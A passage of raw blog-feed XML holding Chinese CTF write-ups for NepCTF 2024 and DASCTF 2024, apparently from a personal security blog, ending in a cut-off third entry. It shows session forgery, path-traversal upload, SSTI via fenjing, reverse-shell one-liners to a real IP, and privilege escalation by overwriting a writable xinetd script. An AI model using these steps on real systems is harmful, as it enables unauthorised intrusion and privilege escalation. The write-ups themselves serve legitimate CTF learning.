punctuation">,</span> <span class="token number">400</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>提供了转账功能</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/view_balance/&lt;username>'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">view_balance</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> username <span class="token keyword">in</span> users<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token punctuation">:</span> username<span class="token punctuation">,</span> <span class="token string">"balance"</span><span class="token punctuation">:</span> users<span class="token punctuation">[</span>username<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"balance"</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token string">"User not found"</span><span class="token punctuation">,</span> <span class="token number">404</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到对应用户的余额</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/force_buy_flag'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">force_buy_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">"username"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> session <span class="token keyword">or</span> session<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">"HRP"</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"Permission denied"</span><span class="token punctuation">,</span> <span class="token number">403</span>    target_user <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"target_user"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> target_user <span class="token keyword">not</span> <span class="token keyword">in</span> users<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"User not found"</span><span class="token punctuation">,</span> <span class="token number">404</span>    <span class="token keyword">if</span> users<span class="token punctuation">[</span>target_user<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"balance"</span><span class="token punctuation">]</span> <span class="token operator">>=</span> flag_price<span class="token punctuation">:</span>        users<span class="token punctuation">[</span>target_user<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"balance"</span><span class="token punctuation">]</span> <span class="token operator">-=</span> flag_price        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"User </span><span class="token interpolation"><span class="token punctuation">&#123;</span>target_user<span class="token punctuation">&#125;</span></span><span class="token string"> successfully bought the flag!,"</span></span><span class="token operator">+</span><span class="token string-interpolation"><span class="token string">f"Here is your flag: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>flag<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>    <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"User </span><span class="token interpolation"><span class="token punctuation">&#123;</span>target_user<span class="token punctuation">&#125;</span></span><span class="token string"> does not have sufficient funds"</span></span><span class="token punctuation">,</span> <span class="token number">400</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以强制某个用户购买flag</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/buy_flag'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">buy_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">"username"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"Not logged in"</span><span class="token punctuation">,</span> <span class="token number">403</span>    <span class="token keyword">if</span> users<span class="token punctuation">[</span>session<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"balance"</span><span class="token punctuation">]</span> <span class="token operator">>=</span> flag_price<span class="token punctuation">:</span>        users<span class="token punctuation">[</span>session<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"balance"</span><span class="token punctuation">]</span> <span class="token operator">-=</span> flag_price        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"Here is your flag: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>flag<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>    <span class="token keyword">return</span> <span class="token string">"Insufficient funds"</span><span class="token punctuation">,</span> <span class="token number">400</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>自己买flag，明显钱不够</p><p>看一下&#x2F;admin后台</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/admin'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span>        password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> username <span class="token operator">==</span> <span class="token string">'admin'</span> <span class="token keyword">and</span> password <span class="token operator">==</span> users<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            session<span class="token punctuation">[</span><span class="token string">'admin_logged_in'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">True</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'admin_dashboard'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"Invalid credentials"</span><span class="token punctuation">,</span> <span class="token number">401</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'admin_login.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/admin/dashboard'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">admin_dashboard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'admin_logged_in'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token string">'file'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>files<span class="token punctuation">:</span>            <span class="token builtin">file</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token builtin">file</span><span class="token punctuation">.</span>filename <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'No selected file'</span>        filename <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>filename        <span class="token builtin">file</span><span class="token punctuation">.</span>save<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token string">'File uploaded successfully'</span>    cmd_output <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">if</span> <span class="token string">'cmd'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>args<span class="token punctuation">:</span>        <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token string">"lock.txt"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 检查当前目录下是否存在lock.txt</span>            cmd <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'cmd'</span><span class="token punctuation">)</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                cmd_output <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                cmd_output <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            cmd_output <span class="token operator">=</span> <span class="token string">"lock.txt not found. Command execution not allowed."</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'admin_dashboard.html'</span><span class="token punctuation">,</span> users<span class="token operator">=</span>users<span class="token punctuation">,</span> cmd_output<span class="token operator">=</span>cmd_output<span class="token punctuation">,</span> active_tab<span class="token operator">=</span><span class="token string">"cmdExecute"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>需要 session 里的 admin_logged_in 为 True</p><p>可以直接伪造 session 登录 admin 后台</p><p><img src="/blog/2024/08/24/NepCTF-2024/image-20240824170911351.png" alt="image-20240824170911351"></p><p><code>eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW5fbG9nZ2VkX2luIjp0cnVlfQ.Zsmizw.c7Mw-jnRnROmAaqnFf1CJkdqcys</code></p><p>进到后台dashboard，有三个功能</p><p><img src="/blog/2024/08/24/NepCTF-2024/image-20240824171056562.png" alt="image-20240824171056562"></p><p>命令执行需要在目录下有 lock.txt 才能使用</p><p>文件上传</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">UPLOAD_FOLDER <span class="token operator">=</span> <span class="token string">'templates/uploads'</span>ALLOWED_EXTENSIONS <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'png'</span><span class="token punctuation">,</span> <span class="token string">'jpg'</span><span class="token punctuation">,</span> <span class="token string">'txt'</span><span class="token punctuation">&#125;</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span> <span class="token operator">=</span> UPLOAD_FOLDER<span class="token keyword">def</span> <span class="token function">allowed_file</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">'.'</span> <span class="token keyword">in</span> filename <span class="token keyword">and</span> filename<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">in</span> ALLOWED_EXTENSIONS<span class="token operator">/</span><span class="token operator">*</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">*</span><span class="token operator">/</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token string">'file'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>files<span class="token punctuation">:</span>            <span class="token builtin">file</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token builtin">file</span><span class="token punctuation">.</span>filename <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'No selected file'</span>        filename <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>filename        <span class="token builtin">file</span><span class="token punctuation">.</span>save<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token string">'File uploaded successfully'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上传的文件保存在了<code>templates/uploads</code>下，没做路径穿越的过滤</p><p>直接上传目录穿越</p><p><img src="/blog/2024/08/24/NepCTF-2024/image-20240824171947901.png" alt="image-20240824171947901"></p><p>然后就能命令执行，嗯很好果然没权限读flag</p><p><img src="/blog/2024/08/24/NepCTF-2024/image-20240824172137281.png" alt="image-20240824172137281"></p><p>看一下用户列表</p><p><img src="/blog/2024/08/24/NepCTF-2024/image-20240824172852596.png" alt="image-20240824172852596"></p><p>既然有账密我们就可以登录这些用户然后直接转账给HRP买flag</p><p><img src="/blog/2024/08/24/NepCTF-2024/image-20240824172948421.png" alt="image-20240824172948421"></p><p>拿到admin的密码：<code>aJc2W3HMWvwoEd9</code></p><p>貌似没啥用</p><p>弹个shell先</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">bash</span> <span class="token parameter variable">-c</span> <span class="token string">'bash -i >&amp; /dev/tcp/115.236.153.177/30908 &lt;&amp;1'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>python起终端</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">python3 <span class="token operator">-</span>c <span class="token string">'import pty; pty.spawn("/bin/bash")'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后一波尝试find提权操作之后靶机崩了，测试了一下发现不能遍历 &#x2F;sys 目录</p><p>注意到这里有个pwn文件，dump下来看看</p><p><img src="/blog/2024/08/24/NepCTF-2024/image-20240824182008766.png" alt="image-20240824182008766"></p><p>start.sh的内容是执行pwn文件</p><p><code>ps -ef</code>一下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root           <span class="token number">1</span>       <span class="token number">0</span>  <span class="token number">0</span> <span class="token number">14</span>:28 ?        00:00:00 /bin/sh <span class="token parameter variable">-c</span> <span class="token function">service</span> xinetd start <span class="token operator">&amp;&amp;</span><span class="token function">su</span> root <span class="token parameter variable">-c</span> <span class="token string">"/flag.sh"</span> <span class="token operator">&amp;&amp;</span> <span class="token function">su</span> ctfuser <span class="token parameter variable">-c</span> <span class="token string">"python3 app.py"</span>root          <span class="token number">20</span>       <span class="token number">1</span>  <span class="token number">0</span> <span class="token number">14</span>:28 ?        00:00:00 <span class="token function">su</span> ctfuser <span class="token parameter variable">-c</span> python3 app.pyctfuser       <span class="token number">21</span>      <span class="token number">20</span>  <span class="token number">0</span> <span class="token number">14</span>:28 ?        00:00:00 <span class="token function">sh</span> <span class="token parameter variable">-c</span> python3 app.pyctfuser       <span class="token number">22</span>      <span class="token number">21</span>  <span class="token number">2</span> <span class="token number">14</span>:28 ?        00:00:05 python3 app.pyroot          <span class="token number">24</span>       <span class="token number">1</span>  <span class="token number">0</span> <span class="token number">14</span>:28 ?        00:00:00 /usr/sbin/xinetd <span class="token parameter variable">-pidfile</span> /run/xinetd.pid <span class="token parameter variable">-stayalive</span> <span class="token parameter variable">-inetd_compat</span> <span class="token parameter variable">-inetd_ipv6</span>ctfuser       <span class="token number">27</span>      <span class="token number">22</span>  <span class="token number">0</span> <span class="token number">14</span>:29 ?        00:00:00 /bin/sh <span class="token parameter variable">-c</span> <span class="token assign-left variable">GZCTF_FLAG</span><span class="token operator">=</span><span class="token number">0</span> <span class="token operator">&amp;&amp;</span> 我们的命令<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>想半天传了个fscan扫127.0.0.1，发现开着8888端口，<code>xinetd.d</code>是常见的起 pwnserver 指令</p><hr><h2 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /proc/22/environ<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>直接读起web服务的那个pid的环境变量，这里是22</p><p>因为flag环境变量是在后面执行命令时被清空的，只对当前终端（对应pid27）有效</p><hr><h2 id="预期-1"><a href="#预期-1" class="headerlink" title="预期"></a>预期</h2><p><code>ls -lh /etc/xinetd.d/</code>发现里面有个 pwnservice 有写入的权限，查看pwnservice（这一步跳了，直接用晨曦师傅的图）</p><p><img src="/blog/2024/08/24/NepCTF-2024/image-20240831123025845.png" alt="image-20240831123025845"></p><p>注意到靶机里面有nc，8888端口上是个pwnserver，那么我们可以直接nc本地的8888端口</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> <span class="token number">127.0</span>.0.1 <span class="token number">8888</span>/home/ctfuser/start.sh: line <span class="token number">2</span>: ./pwn: No such <span class="token function">file</span> or directory<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>说明这里是执行了 &#x2F;home&#x2F;ctfuser&#x2F;start.sh</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#/bin/bash</span>./pwn<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>注意到 start.sh 有写权限，也就是说我们可以尝试写入恶意命令，然后再次nc就可以改权限了</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"#/bin/bash"</span><span class="token operator">></span>start.sh<span class="token builtin class-name">echo</span> <span class="token string">"chmod 777 /home/ctfuser/f*"</span><span class="token operator">>></span>start.sh<span class="token function">nc</span> <span class="token number">127.0</span>.0.1 <span class="token number">8888</span><span class="token function">ls</span> <span class="token parameter variable">-lh</span><span class="token function">cat</span> flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="Always-RCE-First（Unsolved）"><a href="#Always-RCE-First（Unsolved）" class="headerlink" title="Always RCE First（Unsolved）"></a>Always RCE First（Unsolved）</h1><p>参考：<a href="https://forum.butian.net/article/513">https://forum.butian.net/article/513</a></p><p>有java不看（</p><hr><h1 id="NepRouter（Unsolved）"><a href="#NepRouter（Unsolved）" class="headerlink" title="NepRouter（Unsolved）"></a>NepRouter（Unsolved）</h1><p>有二进制不看（</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;php master，除了php其它都不会（&lt;/p&gt;
&lt;p&gt;参考wp：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://chenxi9981.github.io/NepCTF_2024/&quot;&gt;https://chenxi9981.github.io/NepCTF_2024/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://natro92.fun/posts/64a8e859&quot;&gt;https://natro92.fun/posts/64a8e859&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CTF线上赛" scheme="http://c1oudfl0w0.github.io/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    
    
    <category term="提权" scheme="http://c1oudfl0w0.github.io/blog/tags/%E6%8F%90%E6%9D%83/"/>
    
    <category term="SSTI" scheme="http://c1oudfl0w0.github.io/blog/tags/SSTI/"/>
    
    <category term="反序列化" scheme="http://c1oudfl0w0.github.io/blog/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>DASCTF2024八月赛</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/08/24/DASCTF2024%E5%85%AB%E6%9C%88%E8%B5%9B/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/08/24/DASCTF2024%E5%85%AB%E6%9C%88%E8%B5%9B/</id>
    <published>2024-08-24T02:40:52.000Z</published>
    <updated>2024-08-31T15:26:44.059Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>签完到看到两道java就跑去打nep的屑（</p><p>官方wp：</p><p><a href="https://www.yuque.com/yuqueyonghu30d1fk/gd2y5h/iavv2gfao7ea2buw?singleDoc#xwxbK">https://www.yuque.com/yuqueyonghu30d1fk/gd2y5h/iavv2gfao7ea2buw?singleDoc#xwxbK</a></p><span id="more"></span><hr><h1 id="Truman"><a href="#Truman" class="headerlink" title="Truman"></a>Truman</h1><p>进去，发现是ssti</p><p>fenjing秒了</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> functools<span class="token keyword">import</span> time<span class="token keyword">import</span> requests<span class="token keyword">from</span> fenjing <span class="token keyword">import</span> exec_cmd_payloadURL <span class="token operator">=</span> <span class="token string">"http://8bff7c8b-e015-472b-91ac-958ea57a03df.node5.buuoj.cn:81/"</span><span class="token decorator annotation punctuation">@functools<span class="token punctuation">.</span>lru_cache</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>payload<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 如果字符串s可以通过waf则返回True, 否则返回False</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.02</span><span class="token punctuation">)</span> <span class="token comment"># 防止请求发送过多</span>    resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>URL<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"code"</span><span class="token punctuation">:</span> payload<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">"Oops"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> resp<span class="token punctuation">.</span>text<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    shell_payload<span class="token punctuation">,</span> will_print <span class="token operator">=</span> exec_cmd_payload<span class="token punctuation">(</span>        waf<span class="token punctuation">,</span> <span class="token string">'bash -c "bash -i >&amp; /dev/tcp/115.236.153.177/30908 0>&amp;1"'</span>    <span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> will_print<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"这个payload不会产生回显！"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>shell_payload<span class="token operator">=</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/08/24/DASCTF2024%E5%85%AB%E6%9C%88%E8%B5%9B/image-20240824105011407.png" alt="image-20240824105011407"></p><hr><h1 id="Monument"><a href="#Monument" class="headerlink" title="Monument"></a>Monument</h1>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;签完到看到两道java就跑去打nep的屑（&lt;/p&gt;
&lt;p&gt;官方wp：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.yuque.com/yuqueyonghu30d1fk/gd2y5h/iavv2gfao7ea2buw?singleDoc#xwxbK&quot;&gt;https://www.yuque.com/yuqueyonghu30d1fk/gd2y5h/iavv2gfao7ea2buw?singleDoc#xwxbK&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CTF线上赛" scheme="http://c1oudfl0w0.github.io/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>巅峰极客2024</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/08/17/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/08/17/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024/</id>
    <published>2024-08-17T02:03:16.000Z</published>
    <updated>2024-08-19T09:20:10.898Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>web专场（x</p><p>提权专场（√</p><span id="more"></span><p><img src="/blog/2024/08/17/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024/image-20240817211814882.png" alt="image-20240817211814882"></p><hr><h1 id="EncirclingGame"><a href="#EncirclingGame" class="headerlink" title="EncirclingGame"></a>EncirclingGame</h1><p>小游戏</p><p><img src="/blog/2024/08/17/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024/image-20240817100613146.png" alt="image-20240817100613146"></p><hr><h1 id="GoldenHornKing"><a href="#GoldenHornKing" class="headerlink" title="GoldenHornKing"></a>GoldenHornKing</h1><blockquote><p>fastapi + 内存马</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> jinja2<span class="token keyword">import</span> functools<span class="token keyword">import</span> uvicorn<span class="token keyword">from</span> fastapi <span class="token keyword">import</span> FastAPI<span class="token keyword">from</span> fastapi<span class="token punctuation">.</span>templating <span class="token keyword">import</span> Jinja2Templates<span class="token keyword">from</span> anyio <span class="token keyword">import</span> fail_after<span class="token punctuation">,</span> sleep<span class="token keyword">def</span> <span class="token function">timeout_after</span><span class="token punctuation">(</span>timeout<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">decorator</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token decorator annotation punctuation">@functools<span class="token punctuation">.</span>wraps</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span>        <span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">wrapper</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">with</span> fail_after<span class="token punctuation">(</span>timeout<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token keyword">await</span> func<span class="token 